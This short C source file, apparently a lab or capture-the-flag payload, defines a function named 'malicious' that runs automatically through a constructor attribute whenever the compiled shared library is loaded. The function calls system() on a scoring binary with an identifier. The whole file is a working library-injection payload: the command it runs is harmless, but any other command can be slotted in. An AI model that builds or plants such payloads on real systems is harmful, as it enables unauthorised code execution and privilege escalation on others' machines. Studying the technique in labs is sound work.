#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score c9dab298-3a81-42de-ad84-2bb82d40d4ad");
}